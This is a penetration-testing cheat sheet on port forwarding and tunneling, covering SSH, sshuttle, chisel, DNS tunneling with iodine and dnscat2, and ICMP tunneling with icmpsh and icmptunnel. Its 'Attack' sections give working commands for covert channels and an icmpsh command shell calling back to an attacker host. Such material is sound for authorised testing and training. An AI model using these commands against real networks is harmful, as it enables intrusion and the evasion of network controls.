# Port Redirection & Tunneling

## Port Redirection & Tunneling

We use port redirection and/or tunneling when we want to forward a port that's listening only on localhost \(127.0.0.1\). 

## **SSH** <a id="ssh"></a>

We can use SSH to perform port redirection and tunneling

#### SOCKS Proxy

```text
ssh -D8080 [user]@[host]

ssh -N -f -D 9000 [user]@[host]
-f : ssh in background
-N : do not execute a remote command
```

Cool Tip: Konami SSH Port forwarding

```text
[ENTER] + [~C]
-D 1090
```

#### Local Port Forwarding

```text
ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]
```

#### Remote Port Forwarding

```text
ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]
ssh -R 3389:10.1.1.224:3389 root@10.11.0.32
```

## SSHUTTLE

You can **tunnel** via **ssh** all the **traffic** to a **subnetwork** through a host. For example, forwarding all the traffic going to 10.10.10.0/24

```text
pip install sshuttlesshuttle -r user@host 10.10.10.10/24
```

## Chisel <a id="chisel"></a>

Chisel can be downloaded here: [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

 You need to use the **same version for the client and the server**.

### Windows Port Forwarding <a id="socks"></a>

```text
./chisel server -p 8080 --reverse
./chisel-x64.exe client 10.10.14.3:8080 R:socks
```

### Linux Port forwarding <a id="port-forwarding"></a>

```text
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505
```

## DNS Tunneling

### Detection

Can we resolve internal domain?

```text
nslookup acmebank.local
Server:    192.168.1.1
Address:  192.168.1.153

Name:  acmebank.local
Address: 192.168.10.12
```

Can we resolve an external domain through the company DNS server? \(if yes, we can perform DNS tunneling\)

```text
nslookup google.com
Server:    192.168.1.1
Address:  192.168.1.153

Non-authoritative answer:
Address: 216.58.209.14
Name:  google.com
```

Can we communicate with external DNS? \(another finding\)

```text
nslookup pentest.blog 8.8.8.8
Server: 8.8.8.8
Address: 8.8.8.853

Non-authoritative answer:
Name: pentest.blog
Address: 104.27.169.40
Name: pentest.blog
Address: 104.27.168.40
```

### Attack

#### iodine

iodine creates 2 tun adaptors and sends data between these 2 adapters by tunneling like a DNS query

Server-Side:

```text
iodined -f -c -P <pass> <IP address> <domain> 
eg: 
iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
```

Client-Side:

```text
iodine -f -P <pass> <domain> r 
eg: 
iodine -f -P P@ssw0rd tunneldomain.com -r
```

#### dnscat2

Server-Side:

```text
ruby ./dnscat2.rb tunneldomain.com
```

Client-Side:

```text
./dnscat2 tunneldomain.com
```

```text
dnscat2> session -i 1
command session (debian) 1> listen 127.0.0.1:8080 10.0.0.20:80 
```

## ICMP Tunneling

ICMP Tunneling can be done by changing the Payload Data so it will contain the data we want to send.

### icmpsh

It does not require administrative privileges. C2-channel, slave runs on Windows \(host\) and master runs on Kali \(attacker\)

### Attack

Clone or download icmpsh:

```text
git clone https://github.com/inquisb/icmpsh.git
```

Master - Kali:

```text
sysctl -w net.ipv4.icmp_echo_ignore_all=1 
cd icmpsh
./icmpsh_m.py <attacker’s-IP> <target-IP>
```

Slave - Windows

```text
icmpsh.exe -t <attacker’s-IP>
```

Master - Kali

```text
./icmpsh_m.py <attacker’s-IP> <target-IP>
```

We can use wireshark to see commands run in the data

### icmptunnel

Server-side:

```text
git clone https://github.com/jamesbarlow/icmptunnel.git 
cd icmptunnel
make
```

ICMP echo reply disable.

```text
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
```

ICMP tunnel run in server-side and set IP to tun0 adaptor

```text
./icmptunnel -s
Ctrlz
bg
/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0 ifconfig
```

Client-side:

```text
git clone https://github.com/jamesbarlow/icmptunnel.git 
cd icmptunnel
make
```

ICMP echo reply disable.

```text
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all 
./icmptunnel 192.168.1.108
ctrl z
/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0
```

Connect to ssh using ICMP from server to client using tun interface

```text
ssh username@10.0.0.1
```

## References

Most of the tunneling techniques covered here were extracted from here:

{% embed url="https://github.com/areyou1or0/Tunneling" %}







###  <a id="vpn-tunnel"></a>

